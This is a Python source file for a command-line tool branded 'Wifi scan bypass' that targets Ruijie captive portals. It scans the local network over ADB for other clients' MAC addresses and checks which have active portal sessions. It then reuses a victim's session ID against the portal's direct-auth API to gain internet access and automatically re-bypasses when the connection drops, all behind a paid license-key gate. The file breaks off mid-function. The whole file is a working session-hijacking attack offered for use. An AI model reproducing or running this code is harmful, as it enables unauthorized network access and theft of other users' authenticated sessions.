import os
import re
import sys
import time
import json
import uuid
import socket
import hashlib
import base64
import string
import random
import shutil
import subprocess
import urllib3
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

# ==================== COLORS ====================
CYAN    = "\033[1;36m"
YELLOW  = "\033[1;33m"
GREEN   = "\033[1;32m"
RED     = "\033[1;31m"
BLUE    = "\033[0;34m"
WHITE   = "\033[1;37m"
MAGENTA = "\033[1;35m"
RESET   = "\033[0m"
DG      = "\033[0;32m"
DW      = "\033[0;37m"
BOLD    = "\033[1m"

# ==================== AES ====================
KEY_HEX = "000102030405060708090a0b0c0d0e0f"
IV_HEX  = "101112131415161718191a1b1c1d1e1f"
key = bytes.fromhex(KEY_HEX)
iv  = bytes.fromhex(IV_HEX)

def aes_encrypt(plain_text):
    if HAS_CRYPTO:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return base64.b64encode(cipher.encrypt(pad(plain_text.encode(), AES.block_size))).decode()
    else:
        return base64.b64encode(plain_text.encode()).decode()

def aes_decrypt(token):
    if HAS_CRYPTO:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(base64.b64decode(token)), AES.block_size).decode()
    else:
        return base64.b64decode(token).decode()

# ==================== PATHS & GLOBAL STATE ====================
DEV_FILE       = os.path.expanduser("~/.rj_devid")
KEY_FILE       = os.path.expanduser("~/.rj_key")
ADB_IP_FILE    = os.path.expanduser("~/.rj_adb_ip")
ADB_GW_FILE    = os.path.expanduser("~/.rj_adb_gw")

SELECTED_MAC   = None
SELECTED_NAME  = "Unknown"
PORTAL_URL     = None
SCANNED_DEVICES = []
ACTIVE_DEVICES  = []
GATEWAY_IP      = None

# ==================== DEVICE ID ====================
def get_device_id():
    if os.path.exists(DEV_FILE):
        return open(DEV_FILE).read().strip()
    seed = socket.gethostname()
    try:
        seed += str(uuid.getnode())
    except:
        pass
    h = hashlib.sha256(seed.encode()).hexdigest()[:12].upper()
    dev_id = f"DEV-{h}"
    with open(DEV_FILE, "w") as f:
        f.write(dev_id)
    return dev_id

DEVICE_ID = get_device_id()

# ==================== KEY / LICENSE ====================
def load_expiry():
    if not os.path.exists(KEY_FILE):
        return None
    try:
        raw = open(KEY_FILE).read().strip()
        dec = aes_decrypt(raw)
        dev, ts = dec.split("|", 1)
        if dev != DEVICE_ID:
            return None
        exp = float(ts)
        if time.time() > exp:
            return None
        return exp
    except:
        return None

REVOKED_SENTINEL = "REVOKED"

def save_key(key_str):
    try:
        dec = aes_decrypt(key_str.strip())
        dev, ts = dec.split("|", 1)
        if dev != DEVICE_ID:
            return None
        exp = float(ts)
        with open(KEY_FILE, "w") as f:
            f.write(key_str.strip())
        if time.time() > exp:
            return REVOKED_SENTINEL
        return exp
    except:
        return None

def fmt_expiry(ts):
    remain = max(0, int(ts - time.time()))
    d = remain // 86400
    h = (remain % 86400) // 3600
    m = (remain % 3600) // 60
    return f"{d}d {h}h {m}min"

# ==================== BANNER ====================
SKYBY_ART = [
    r"   _____   _  __ __     __   ____   __     __",
    r"  / ____| | |/ / \ \   / /  |  _ \  \ \   / /",
    r" | (___   | ' /   \ \_/ /   | |_) |  \ \_/ / ",
    r"  \___ \  |  <     \   /    |  _ <    \   /  ",
    r"  ____) | | . \     | |     | |_) |    | |   ",
    r" |_____/  |_|\_\    |_|     |____/     |_|   ",
]

def term_width():
    try:
        return shutil.get_terminal_size().columns
    except:
        return 60

def cprint(text, color=""):
    clean = re.sub(r'\033\[[0-9;]*m', '', text)
    p = max(0, (term_width() - len(clean)) // 2)
    print(" " * p + color + text + RESET)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def _sep():
    return f"{YELLOW}{'-' * term_width()}{RESET}"

def print_header(expiry=None):
    clear()
    print()
    for line in SKYBY_ART:
        cprint(line, GREEN)
    print()
    cprint("[ Wifi scan bypass ]", YELLOW)
    cprint("Telegram -> @paing_3521", GREEN)
    print(_sep())
    print(f"{DG}[*] Device ID : {CYAN}{DEVICE_ID}{RESET}")
    if expiry:
        print(f"{DG}[*] Expiry    : {GREEN}{fmt_expiry(expiry)}{RESET}")
    else:
        print(f"{DG}[*] Expiry    : {RED}Not Registered{RESET}")
    if SELECTED_MAC:
        print(f"{DG}[*] Target MAC: {YELLOW}{SELECTED_MAC}{RESET}  ({SELECTED_NAME})")
    if PORTAL_URL:
        short_url = PORTAL_URL[:55] + "..." if len(PORTAL_URL) > 58 else PORTAL_URL
        print(f"{DG}[*] Portal URL: {CYAN}{short_url}{RESET}")
    if GATEWAY_IP:
        print(f"{DG}[*] Gateway IP: {GREEN}{GATEWAY_IP}{RESET}")
    print(_sep())

# ==================== KEY SCREEN ====================
def key_screen():
    while True:
        clear()
        print()
        for line in SKYBY_ART:
            cprint(line, GREEN)
        print()
        cprint("[ Wifi scan bypass ]", YELLOW)
        print()
        cprint("Telegram -> @paing_3521", GREEN)
        print(_sep())
        print(f"{DG}[*] Device ID : {CYAN}{DEVICE_ID}{RESET}")
        print(f"{DG}[*] Expiry    : {RED}Not Registered{RESET}")
        print(_sep())
        print()
        key_in = input(f"  {YELLOW}Enter Key : {RESET}").strip()
        if not key_in:
            continue
        result = save_key(key_in)
        if result and result != REVOKED_SENTINEL:
            print()
            print(f"  {GREEN}+----------------------------------+{RESET}")
            print(f"  {GREEN}|  Key Accepted!                   |{RESET}")
            print(f"  {GREEN}|  Expiry : {fmt_expiry(result):<22}|{RESET}")
            print(f"  {GREEN}+----------------------------------+{RESET}")
            time.sleep(1.8)
            return result
        elif result == REVOKED_SENTINEL:
            print()
            print(f"  {RED}+----------------------------------+{RESET}")
            print(f"  {RED}|  *** KEY REVOKED ***             |{RESET}")
            print(f"  {RED}|  Your license has been           |{RESET}")
            print(f"  {RED}|  deactivated by Admin.           |{RESET}")
            print(f"  {RED}+----------------------------------+{RESET}")
            print()
            input(f"  {YELLOW}Press Enter... {RESET}")
        else:
            print()
            print(f"  {RED}+----------------------------------+{RESET}")
            print(f"  {RED}|  Invalid Key!                    |{RESET}")
            print(f"  {RED}|  Contact Admin to get your key.  |{RESET}")
            print(f"  {RED}+----------------------------------+{RESET}")
            print()
            input(f"  {YELLOW}Press Enter to retry... {RESET}")

# ==================== MENU ====================
def print_menu(expiry):
    print_header(expiry)
    print(f"  {GREEN}[1] WiFi Setup{RESET}")
    print(f"  {YELLOW}[2] MAC Scan{RESET}")
    print(f"  {GREEN}[3] Active Check{RESET}")
    print(f"  {YELLOW}[4] Select Target{RESET}")
    print(f"  {YELLOW}[5] AES Encrypt Tool{RESET}")
    print(f"  {YELLOW}[6] Encode Session URL{RESET}")
    print(f"  {GREEN}[7] Auto Bypass{RESET}")
    print(f"  {RED}[0] Exit{RESET}")
    print(_sep())

# ==================== HELPERS ====================
def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

def check_adb():
    try:
        result = subprocess.run(["adb", "devices"], capture_output=True, text=True, timeout=5)
        lines = result.stdout.splitlines()
        for line in lines[1:]:
            if line.strip() and "device" in line and "offline" not in line:
                return True
        return False
    except:
        return False

def get_last_adb_ip():
    if os.path.exists(ADB_IP_FILE):
        return open(ADB_IP_FILE).read().strip()
    return None

def save_adb_ip(ip_port):
    with open(ADB_IP_FILE, "w") as f:
        f.write(ip_port.strip())

def get_last_adb_gw():
    if os.path.exists(ADB_GW_FILE):
        return open(ADB_GW_FILE).read().strip()
    return None

def save_adb_gw(gw):
    with open(ADB_GW_FILE, "w") as f:
        f.write(gw.strip())

def is_internet_available():
    try:
        param = '-n' if os.name == 'nt' else '-c'
        result = subprocess.run(
            ['ping', param, '1', '-W', '1', '8.8.8.8'],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3
        )
        return result.returncode == 0
    except:
        pass
    try:
        socket.setdefaulttimeout(2)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(("8.8.8.8", 53))
        return True
    except:
        return False

def get_gateway_ip():
    try:
        output = subprocess.check_output("ip route", shell=True, stderr=subprocess.DEVNULL).decode()
        match = re.search(r'default\s+via\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
        if match:
            return match.group(1)
    except:
        pass
    if check_adb():
        try:
            output = subprocess.check_output(["adb", "shell", "ip", "route"],
                                             stderr=subprocess.DEVNULL).decode()
            match = re.search(r'default\s+via\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
            if match:
                return match.group(1)
            match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
            if match:
                base = ".".join(match.group(1).split(".")[:3])
                return base + ".1"
        except:
            pass
    return None

def print_progress_bar(current, total, suffix=""):
    percent = (current / total) * 100 if total > 0 else 0
    filled = int(percent / 5)
    bar = "█" * filled + "░" * (20 - filled)
    sys.stdout.write(f"\r{YELLOW}Progress: |{bar}| {current}/{total} ({percent:.0f}%) {suffix}{RESET}")
    sys.stdout.flush()

# ==================== VENDOR DB ====================
OFFLINE_VENDORS = {
    "BC:D8:BB": "Apple", "D6:DD:D1": "Realme", "F8:AB:82": "Xiaomi/Poco",
    "C2:37:76": "Redmi", "5C:D0:6E": "Xiaomi", "0A:13:EA": "Apple",
    "4A:9E:DC": "Apple", "7A:47:DF": "Apple", "5E:F2:91": "Apple",
    "C6:12:93": "Oppo",  "DA:C3:AF": "Tecno", "7E:7F:F4": "Oppo",
    "22:B1:C6": "Samsung","62:26:F1": "Apple", "DA:EB:DC": "Xiaomi",
    "D6:C5:AA": "Redmi", "6A:A9:C0": "Redmi", "EC:21:50": "Vivo",
    "FA:F9:95": "Oppo",  "C8:1E:C2": "Itel",  "62:DA:06": "Xiaomi",
    "4A:C1:6C": "Apple", "8E:F8:1D": "Infinix","A6:0E:8B": "Oppo",
    "4A:55:45": "Poco",  "C4:B2:5B": "Router/Gateway","8E:35:3F": "Oppo",
    "5E:A0:1B": "Vivo",  "7E:38:84": "Oppo",  "82:99:5B": "Itel",
    "FA:57:54": "Apple", "C2:33:21": "Xiaomi", "DE:75:6A": "Unknown",
    "90:CB:A3": "Unknown","96:E2:07": "Apple", "52:84:E2": "Tecno",
    "C4:AB:B2": "Vivo",  "C2:0C:96": "Vivo",  "F2:15:5A": "Redmi",
    "1E:30:57": "Vivo",  "0A:09:7D": "Redmi", "CE:D5:2B": "Redmi",
    "3E:DF:A5": "Redmi", "12:CD:C6": "Redmi", "B6:A6:25": "Vivo",
    "72:33:28": "Redmi", "C6:59:19": "Xiaomi", "A2:04:DD": "Honor",
    "A2:CC:CD": "Oppo",  "66:A2:61": "Unknown"
}

def get_vendor_offline(mac):
    prefix = mac[:8].upper()
    return OFFLINE_VENDORS.get(prefix, "Unknown")

# ==================== OPTION 1: WIFI SETUP ====================
def option_wifi_setup(expiry):
    global SCANNED_DEVICES, ACTIVE_DEVICES, SELECTED_MAC, SELECTED_NAME, GATEWAY_IP
    print_header(expiry)
    print(f"\n{CYAN}[*] Initializing Setup Process...{RESET}")
    time.sleep(0.4)

    print(f"{CYAN}[*] Checking current session & unbinding...{RESET}")
    time.sleep(0.4)
    if is_internet_available():
        print()
        print(f"{RED}╔══════════════════════════════════════════╗{RESET}")
        print(f"{RED}║  ⚠  INTERNET DETECTED — SETUP BLOCKED   ║{RESET}")
        print(f"{RED}╠══════════════════════════════════════════╣{RESET}")
        print(f"{RED}║  Internet detected. Blocked.             ║{RESET}")
        print(f"{RED}║  Connect WiFi only (no voucher yet)      ║{RESET}")
        print(f"{RED}║  then run Setup again.                   ║{RESET}")
        print(f"{RED}╚══════════════════════════════════════════╝{RESET}")
        print()
        input(f"{YELLOW}[!] Press Enter to go back...{RESET}")
        return

    print(f"{CYAN}[*] Fetching network configuration...{RESET}")
    time.sleep(0.5)
    gw = get_gateway_ip()
    if gw:
        GATEWAY_IP = gw
        print(f"{GREEN}[ ✓ ] Gateway IP: {WHITE}{GATEWAY_IP}{RESET}")
    else:
        print(f"{YELLOW}[!] Gateway IP not found (ADB not connected yet?){RESET}")

    SCANNED_DEVICES = []
    ACTIVE_DEVICES  = []
    SELECTED_MAC    = None
    SELECTED_NAME   = "Unknown"

    print(f"{GREEN}[ ✓ ] Setup Completed! (Device lists cleared){RESET}")
    print()
    input(f"{DW}Press Enter to return...{RESET}")

# ==================== OPTION 2: MAC SCAN ====================
def adb_connect_step():
    current_gw = get_gateway_ip()
    last_gw    = get_last_adb_gw()
    last_ip    = get_last_adb_ip()
    same_wifi  = bool(last_gw and current_gw and last_gw == current_gw)

    # WiFi မပြောင်းဘူး + saved IP ရှိရင် → auto-reconnect၊ မမေးဘူး
    if last_ip and same_wifi:
        print(f"{CYAN}[*] Same WiFi — auto ADB reconnect to {last_ip}...{RESET}")
        try:
            r = subprocess.run(["adb", "connect", last_ip],
                               capture_output=True, text=True, timeout=8)
            if "connected" in r.stdout.lower() and "unable" not in r.stdout.lower():
                print(f"{GREEN}[ ✓ ] ADB auto-connected to {last_ip}{RESET}")
                return True
        except:
            pass

    if check_adb():
        print(f"{GREEN}[ ✓ ] ADB already connected{RESET}")
        if current_gw:
            save_adb_gw(current_gw)
        return True

    if last_gw and current_gw and last_gw != current_gw:
        print(f"{YELLOW}[!] WiFi changed ({last_gw} → {current_gw}). Please reconnect ADB.{RESET}")
    else:
        print(f"{YELLOW}[*] ADB not connected. Enter IP:PORT to connect.{RESET}")

    ip_port = input(f"{YELLOW}[?] Enter ADB IP:PORT (or skip): {RESET}").strip()
    if not ip_port:
        print(f"{YELLOW}[!] Skipping ADB connection.{RESET}")
        return False
    try:
        r = subprocess.run(["adb", "connect", ip_port],
                           capture_output=True, text=True, timeout=8)
        if "connected" in r.stdout.lower() and "unable" not in r.stdout.lower():
            save_adb_ip(ip_port)
            if current_gw:
                save_adb_gw(current_gw)
            print(f"{GREEN}[ ✓ ] ADB connected to {ip_port}{RESET}")
            return True
        else:
            print(f"{RED}[-] ADB connection failed: {r.stdout.strip()}{RESET}")
            return False
    except Exception as e:
        print(f"{RED}[-] Error: {e}{RESET}")
        return False

def scan_network_via_adb():
    try:
        output = subprocess.check_output(["adb", "shell", "ip", "route"],
                                         stderr=subprocess.DEVNULL).decode()
        m = re.search(r'src\s+(\d{1,3}\.\d{1,3}\.\d{1,3})', output)
        subnet = m.group(1) if m else "192.168.1"
    except:
        subnet = "192.168.1"

    print(f"{YELLOW}[*] Scanning network (IP/MAC)...{RESET}")

    ips = [f"{subnet}.{i}" for i in range(1, 255)]
    with ThreadPoolExecutor(max_workers=80) as ex:
        list(ex.map(
            lambda ip: subprocess.run(["adb", "shell", f"ping -c 1 -w 1 {ip}"],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
            ips
        ))

    results = []
    try:
        output = subprocess.check_output(["adb", "shell", "ip", "neigh", "show"],
                                         stderr=subprocess.DEVNULL).decode()
        seen_macs = set()
        for line in output.splitlines():
            ip_m = re.search(r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', line)
            mac_m = re.search(r'lladdr\s+([0-9a-fA-F:]{17})', line)
            if ip_m and mac_m:
                ip = ip_m.group(1)
                mac = mac_m.group(1).lower()
                if ip.endswith(".1") or ip.endswith(".255"):
                    continue
                if mac in seen_macs:
                    continue
                seen_macs.add(mac)
                results.append({"ip": ip, "mac": mac})
    except:
        pass

    results.sort(key=lambda x: list(map(int, x['ip'].split('.'))))
    return results

def option_mac_scan(expiry):
    global SCANNED_DEVICES, PORTAL_URL
    print_header(expiry)
    print(f"\n{CYAN}[*] MAC Scan — Option 2{RESET}")
    print(_sep())

    print(f"\n{YELLOW}[?] Enter Portal URL (WiFi captive portal link){RESET}")
    print(f"{DW}    e.g: http://portal-as.ruijienetworks.com/auth/wifidogAuth/login?...{RESET}")
    url_in = input(f"\n  {CYAN}Portal URL : {RESET}").strip()
    if not url_in:
        print(f"{RED}[-] Portal URL is required. Please enter it.{RESET}")
        input(f"\n{YELLOW}[!] Press Enter to go back...{RESET}")
        return
    PORTAL_URL = url_in

    print()
    connected = adb_connect_step()
    if not connected:
        print(f"{YELLOW}[!] ADB not connected. Cannot continue scan.{RESET}")
        input(f"\n{YELLOW}[!] Press Enter to go back...{RESET}")
        return

    print()
    devices = scan_network_via_adb()
    SCANNED_DEVICES = devices

    print()
    if devices:
        print(f"{GREEN}[ ✓ ] {len(devices)} devices found.{RESET}\n")
        print(f"{WHITE}Scanned Devices:{RESET}")
        print(f"{DW}{'IP Address':<20} {'MAC Address'}{RESET}")
        print(f"{DG}{'-' * 40}{RESET}")
        for d in devices:
            print(f"{GREEN}{d['ip']:<20}{RESET}{YELLOW}{d['mac']}{RESET}")
    else:
        print(f"{RED}[-] No devices found.{RESET}")

    print()
    input(f"{DW}Press Enter to return to main menu...{RESET}")

# ==================== OPTION 3: ACTIVE CHECK ====================
def check_mac_active(portal_url, mac):
    try:
        api_url = portal_url.replace("/auth/wifidogAuth/login", "/api/auth/wifidog?stage=portal&")
        new_url = replace_mac(api_url, mac)
        if "mac=" not in new_url:
            sep = "&" if "?" in new_url else "?"
            new_url = new_url + f"{sep}mac={mac}"
        sess = requests.Session()
        sess.headers.update({"User-Agent": "Dalvik/2.1.0"})
        resp = sess.get(new_url, timeout=6, allow_redirects=True, verify=False)
        s_id = None
        if "sessionId=" in resp.url:
            s_id = resp.url.split("sessionId=")[1].split("&")[0]
        if not s_id:
            m = re.search(r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)', resp.text)
            if m:
                s_id = m.group(1)
        return s_id
    except:
        return None

def option_active_check(expiry):
    global ACTIVE_DEVICES
    print_header(expiry)
    print(f"\n{CYAN}[*] Active Check — Option 3{RESET}")
    print(_sep())

    if not SCANNED_DEVICES:
        print(f"\n{RED}[-] Scanned device list empty!{RESET}")
        print(f"{YELLOW}[!] Please run Option 2 (MAC Scan) first.{RESET}")
        input(f"\n{YELLOW}[!] Press Enter to go back...{RESET}")
        return

    if not PORTAL_URL:
        print(f"\n{RED}[-] Portal URL not found!{RESET}")
        print(f"{YELLOW}[!] Please run Option 2 (MAC Scan) first.{RESET}")
        input(f"\n{YELLOW}[!] Press Enter to go back...{RESET}")
        return

    total = len(SCANNED_DEVICES)
    print(f"\n{YELLOW}[*] Testing {total} devices...{RESET}")
    print(_sep())
    print(f"\n{GREEN}Active Devices Found:{RESET}")
    print(f"{WHITE}{'IP Address':<20} {'MAC Address'}{RESET}")
    print(f"{DG}{'-' * 40}{RESET}")

    found = []
    import threading
    lock = threading.Lock()

    def worker(idx, device):
        ip  = device['ip']
        mac = device['mac']
        suffix_text = f"| Testing: {ip}"
        print_progress_bar(idx, total, suffix_text)
        sid = check_mac_active(PORTAL_URL, mac)
        if sid:
            with lock:
                device['session_id'] = sid
                found.append(device)
                sys.stdout.write("\r" + " " * 80 + "\r")
                print(f"{GREEN}{ip:<20}{YELLOW}{mac}{RESET}")
        return idx

    for i, dev in enumerate(SCANNED_DEVICES, 1):
        worker(i, dev)

    print_progress_bar(total, total, "Done!")
    print()
    print()

    ACTIVE_DEVICES = found
    if found:
        print(f"{GREEN}[ ✓ ] {len(found)} active devices saved.{RESET}")
    else:
        print(f"{YELLOW}[!] No active devices found.{RESET}")

    print()
    input(f"{DW}Press Enter to return to main menu...{RESET}")

# ==================== OPTION 4: SELECT TARGET ====================
def option_select_target(expiry):
    global SELECTED_MAC, SELECTED_NAME
    print_header(expiry)
    print(f"\n{CYAN}[*] Select Target — Option 4{RESET}")
    print(_sep())

    if not ACTIVE_DEVICES:
        print(f"\n{RED}[-] Active device list empty!{RESET}")
        print(f"{YELLOW}[!] Please run Option 3 (Active Check) first.{RESET}")
        input(f"\n{YELLOW}[!] Press Enter to go back...{RESET}")
        return

    print(f"\n{GREEN}Active Devices:{RESET}")
    for i, d in enumerate(ACTIVE_DEVICES, 1):
        print(f"{WHITE}{i:>2}) {GREEN}{d['ip']:<20}{YELLOW}{d['mac']}{RESET}")

    print()
    choice = input(f"{CYAN}Select device number (1-{len(ACTIVE_DEVICES)}): {RESET}").strip()
    if choice.isdigit():
        idx = int(choice) - 1
        if 0 <= idx < len(ACTIVE_DEVICES):
            SELECTED_MAC  = ACTIVE_DEVICES[idx]['mac']
            SELECTED_NAME = ACTIVE_DEVICES[idx].get('name', ACTIVE_DEVICES[idx]['ip'])
            print()
            print(f"{GREEN}[ ✓ ] Target MAC set  : {WHITE}{SELECTED_MAC}{RESET}")
            print(f"{GREEN}[ ✓ ] Target IP       : {WHITE}{ACTIVE_DEVICES[idx]['ip']}{RESET}")
            time.sleep(1.5)
        else:
            print(f"{RED}[-] Invalid selection.{RESET}")
            time.sleep(1)
    else:
        print(f"{RED}[-] Invalid input.{RESET}")
        time.sleep(1)

# ==================== OPTION 5: AES TOOL ====================
def option_aes_encrypt(expiry):
    print_header(expiry)
    while True:
        text = input(f"\n{YELLOW}Enter text to encrypt (or 'exit'): {RESET}").strip()
        if text == 'exit':
            break
        print(f"{GREEN}[+] Encrypted: {CYAN}{aes_encrypt(text)}{RESET}")

# ==================== OPTION 6: ENCODE URL ====================
def option_encode_session(expiry):
    print_header(expiry)
    mac = input(f"{YELLOW}Enter MAC: {RESET}").strip().lower()
    url = input(f"{YELLOW}Enter URL: {RESET}").strip()
    if mac and url:
        new_url = replace_mac(url, mac) + "WHOAMI1000"
        encoded = base64.b64encode(new_url.encode()).decode()
        print(f"\n{GREEN}[+] Encoded: {CYAN}{encoded}{RESET}")
    input(f"\n{YELLOW}[!] Press Enter...{RESET}")

# ==================== OPTION 7: AUTO BYPASS ====================
def _fetch_session_id(session, portal_url, mac):
    try:
        api_url = portal_url.replace("/auth/wifidogAuth/login", "/api/auth/wifidog?stage=portal&")
        new_url = replace_mac(api_url, mac)
        if "mac=" not in new_url:
            sep = "&" if "?" in new_url else "?"
            new_url = new_url + f"{sep}mac={mac}"
        resp = session.get(new_url, timeout=10, allow_redirects=True, verify=False)
        s_id = None
        if "sessionId=" in resp.url:
            s_id = resp.url.split("sessionId=")[1].split("&")[0]
        if not s_id:
            m = re.search(r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)', resp.text)
            if m:
                s_id = m.group(1)
        return s_id
    except:
        return None

def _do_logon(session, logon_url):
    ip_match = re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", logon_url)
    candidates = [logon_url]
    if ":2060" in logon_url and ip_match:
        orig_ip = ip_match.group()
        for alt_ip in ["10.44.77.240", "10.44.77.1", "10.44.77.254"]:
            if alt_ip != orig_ip:
                candidates.append(logon_url.replace(orig_ip, alt_ip))
    for url in candidates:
        try:
            r = session.get(url, timeout=10, verify=False, allow_redirects=True)
            if r.status_code == 200:
                return True
        except:
            continue
    return False

def run_bypass_for_mac(portal_url, mac, cached_sid=None, verbose=False):
    def _log(msg):
        if verbose:
            print(msg)

    pwn_url = "https://portal-as.ruijienetworks.com/api/auth/direct/?lang=en_US"

    for attempt in range(1, 4):
        try:
            session = requests.Session()
            session.headers.update({"User-Agent": "Dalvik/2.1.0"})

            if attempt == 1 and cached_sid:
                s_id = cached_sid
                _log(f"{DG}[*] Round {attempt}: Using cached sessionId...{RESET}")
            else:
                _log(f"{DG}[*] Round {attempt}: Fetching fresh sessionId...{RESET}")
                s_id = _fetch_session_id(session, portal_url, mac)

            if not s_id:
                _log(f"{YELLOW}[!] Round {attempt}: No sessionId — retrying...{RESET}")
                time.sleep(1.5)
                continue

            _log(f"{DG}[*] Round {attempt}: SessionId → {CYAN}{s_id[:20]}...{RESET}")

            resp2 = session.post(
                pwn_url,
                json={"phoneNumber": "", "sessionId": s_id},
                timeout=12,
                verify=False
            )
            logon_url = resp2.json().get("result", {}).get("logonUrl", "")
            if not logon_url:
                _log(f"{YELLOW}[!] Round {attempt}: No logonUrl in API response — retrying...{RESET}")
                cached_sid = None
                time.sleep(1.5)
                continue

            _log(f"{DG}[*] Round {attempt}: logonUrl → {CYAN}{logon_url[:50]}...{RESET}")

            if _do_logon(session, logon_url):
                return True, s_id

            _log(f"{YELLOW}[!] Round {attempt}: logon request failed — retrying...{RESET}")
            cached_sid = None
            time.sleep(2)

        except Exception as e:
            _log(f"{RED}[!] Round {attempt} error: {e}{RESET}")
            cached_sid = None
            time.sleep(1.5)

    return False, None

def monitor_connection(portal_url, mac, sid):
    fail_count = 0
    print(f"\n{CYAN}[*] Monitoring Connection (Live Update)...{RESET}")
    while True:
        try:
            param = '-n' if os.name == 'nt' else '-c'
            output = subprocess.check_output(
                ['ping', param, '1', '-W', '1', '8.8.8.8'],
                stderr=subprocess.DEVNULL, universal_newlines=True
            )
            m = re.search(r"time[=<](\d+\.?\d*)", output)
            if m:
                ping = float(m.group(1))
                now  = datetime.now().strftime("%H:%M:%S")
                color = GREEN if ping < 100 else (YELLOW if ping < 300 else RED)
                sys.stdout.write(f"\r{DW}[{now}] Ping: {color}{ping}ms{RESET} | Status: {GREEN}ONLINE{RESET}    ")
                sys.stdout.flush()
                fail_count = 0
            else:
                raise Exception()
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Monitoring stopped by user.{RESET}")
            break
        except:
            now = datetime.now().strftime("%H:%M:%S")
            sys.stdout.write(f"\r{DW}[{now}] Ping: {RED}OFFLINE{RESET} | Status: {RED}RECONNECTING...{RESET}   ")
            sys.stdout.flush()
            fail_count += 1

        if fail_count >= 2:
            ok, new_sid = run_bypass_for_mac(portal_url, mac, cached_sid=None, verbose=False)
            if ok:
                sid, fail_count = new_sid, 0
                print(f"\n{DG}[*] Re-Bypass OK → Session: {CYAN}{sid}{RESET}")
            else:
                time.sleep(3)

        time.sleep(1)

def _show_bypass_success(mac, sid):
    crack_steps = ["[          ]", "[##        ]", "[####      ]", "[######    ]",
                   "[########  ]", "[##########]"]
    for step in crack_steps:
        sys.stdout.write(f"\r{GREEN}Cracking... {step}{RESET}")
        sys.stdout.flush()
        time.sleep(0.18)
    print()

    w   = term_width()
    box = min(w - 2, 52)
    bdr = "=" * box
    print(f"\n{GREEN}╔{bdr}╗{RESET}")
    print(f"{GREEN}║{'':^{box}}║{RESET}")
    print(f"{GREEN}║{'██████╗ ██╗   ██╗██████╗  █████╗███████╗███████╗':^{box}}║{RESET}")
    print(f"{GREEN}║{'██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝':^{box}}║{RESET}")
    print(f"{GREEN}║{'██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗':^{box}}║{RESET}")
    print(f"{GREEN}║{'██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║':^{box}}║{RESET}")
    print(f"{GREEN}║{'██████╔╝   ██║   ██║     ██║  ██║███████║███████║':^{box}}║{RESET}")
    print(f"{GREEN}║{'╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝':^{box}}║{RESET}")
    print(f"{GREEN}║{'':^{box}}║{RESET}")
    print(f"{GREEN}║{'S U C C E S S F U L !':^{box}}║{RESET}")
    print(f"{GREEN}║{'':^{box}}║{RESET}")
    print(f"{GREEN}╠{bdr}╣{RESET}")
    print(f"{GREEN}║{RESET} {CYAN}{'TOKEN : ' + sid:<{box-1}}{GREEN}║{RESET}")
    print(f"{GREEN}║{RESET} {YELLOW}{'MAC   : ' + mac:<{box-1}}{GREEN}║{RESET}")
    print(f"{GREEN}╚{bdr}╝{RESET}")
    print()

def option_auto_bypass(expiry):
    global SELECTED_MAC, PORTAL_URL, ACTIVE_DEVICES
    print_header(expiry)
    print(f"\n{CYAN}[*] Auto Bypass — Option 7{RESET}")
    print(_sep())

    if not SELECTED_MAC:
        print(f"\n{RED}[-] Target MAC not set!{RESET}")
        print(f"{YELLOW}[!] Please run Option 4 (Select Target) first.{RESET}")
        input(f"\n{YELLOW}[!] Press Enter...{RESET}")
        return

    if not PORTAL_URL:
        print(f"\n{RED}[-] Portal URL not found!{RESET}")
        print(f"{YELLOW}[!] Please run Option 2 (MAC Scan) first.{RESET}")
        input(f"\n{YELLOW}[!] Press Enter...{RESET}")
        return

    portal_short = PORTAL_URL[:60] + "..." if len(PORTAL_URL) > 63 else PORTAL_URL
    print(f"{YELLOW}[*] Portal URL : {WHITE}{portal_short}{RESET}")

    try_list = []
    selected_dev = None
    for dev in ACTIVE_DEVICES:
        if dev.get('mac') == SELECTED_MAC:
            selected_dev = dev
        else:
            try_list.append(dev)
    if selected_dev:
        try_list.insert(0, selected_dev)
    else:
        try_list.insert(0, {'mac': SELECTED_MAC, 'ip': '?'})

    total       = len(try_list)
    success     = False
    winning_mac = None
    winning_sid = None

    for attempt_num, dev in enumerate(try_list, 1):
        mac        = dev.get('mac')
        ip_label   = dev.get('ip', '?')
        cached_sid = dev.get('session_id')

        print()
        print(f"{CYAN}[{attempt_num}/{total}] Trying MAC : {WHITE}{mac}{DG}  ({ip_label}){RESET}")
        if cached_sid:
            print(f"{DG}      Cached Session : {CYAN}{cached_sid[:24]}...{RESET}")

        ok, sid = run_bypass_for_mac(PORTAL_URL, mac, cached_sid=cached_sid, verbose=True)

        if ok:
            SELECTED_MAC = mac
            winning_mac  = mac
            winning_sid  = sid
            success      = True
            break

        print(f"{RED}      [-] MAC {mac} — all rounds failed.{RESET}")
        if attempt_num < total:
            print(f"{YELLOW}      [>] Trying next active MAC...{RESET}")
            time.sleep(1)

    print(_sep())

    if success:
        _show_bypass_success(winning_mac, winning_sid)
        monitor_connection(PORTAL_URL, winning_mac, winning_sid)
    else:
